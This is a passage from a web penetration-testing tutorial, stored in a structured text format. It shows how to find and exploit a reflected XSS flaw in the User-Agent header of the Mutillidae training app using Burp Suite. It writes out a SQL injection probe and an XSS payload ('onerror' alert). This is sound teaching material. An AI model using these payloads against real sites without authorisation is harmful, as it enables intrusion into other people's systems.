    the OWASP page dedicated to it at, [https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)](https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)).
  prefs: []
  type: TYPE_NORMAL
- en: Exploiting vulnerabilities through HTTP headers
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: When it comes to input validation and sanitization, some developers focus on
    URL and body parameters, overlooking the fact that the whole request can be manipulated
    in the client side and allow for malicious payload to be included in cookies and
    header values.
  prefs: []
  type: TYPE_NORMAL
- en: In this recipe, we will identify and exploit a vulnerability in a header whose
    value is reflected in the response.
  prefs: []
  type: TYPE_NORMAL
- en: How to do it...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'We now came back to Mutillidae. This time, we will use the OWASP 2013 | A1
    - Injection (SQL) | Bypass Authentication | Login exercise:'
  prefs: []
  type: TYPE_NORMAL
- en: First, send a request with any non-existent user and password so the login fails
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Send the request to Burp Suite's Repeater and submit it so we can have a reference
    response.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Once in Repeater, we will test SQL Injection vector in the User-Agent header
    and append `'+and+'1'='` to the header's value.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'If we compare the responses of both requests, we will see that the one with
    the injection is a few bytes bigger than the original one, as shown in the following
    screenshot:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/b56403f8-237f-4ffd-a157-bcb789f4d7f8.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To ease the process of discovering exactly what changed between the two responses,
    send them both to Burp Suite''s **Comparer** (right-click on the response and
    select Send to Comparer from the menu), go to the **Comparer** tab, and you will
    see something like this:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/999344ff-37dc-4925-852e-f6493021a9ed.png)'
  prefs: []
  type: TYPE_IMG
- en: Click on **Words**, as we want to compare the text, looking for those words
    that changed in it.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: In the comparison dialog, select the Sync views checkbox in the lower-right
    corner and look for a highlighted difference. Some pretty obvious things, such
    as the server's date, are going to be different. We are looking for something
    that has to do with the payload we injected. The next screenshot shows a relevant
    difference.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/93226208-83cb-468a-8c9f-947335ef2de2.png)'
  prefs: []
  type: TYPE_IMG
- en: So, our payload in the User-Agent header got directly reflected by the server.
    This could mean that the header is vulnerable to XSS, so let's try it.
  prefs: []
  type: TYPE_NORMAL
- en: Go back to the browser and send another login attempt, but this time intercept
    the request in Burp Suite.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Modify the User-Agent header by adding `&lt;img src=X onerror="alert(''XSS'')">`.
    The next screenshot shows an example:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/b09a4a51-b81f-484d-9c5d-53edb64af486.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Submit the request, and the payload will execute as follows:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](assets/c0ae1a0e-01fd-4ff4-833f-b7d050f31f10.png)'
  prefs: []
  type: TYPE_IMG
- en: How it works...
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this recipe, we were testing for SQL Injection in a login form but noticed,
    by analyzing the server's responses, that the User-Agent header was being reflected
    and took that as an indicator of a possible XSS vulnerability. Then, we successfully
    exploited the XSS by appending an `&lt;IMG>` tag to the header.
  prefs: []
  type: TYPE_NORMAL
- en: Header values, particularly User-Agent, are very commonly stored in application
    and web server logs, which causes payloads sent in such headers to not being processed
    directly  by the target application, but by SIEM (Security Information and Event
    Manager) systems and other log analyzers and aggregators, which may also be vulnerable.
  prefs: []
  type: TYPE_NORMAL
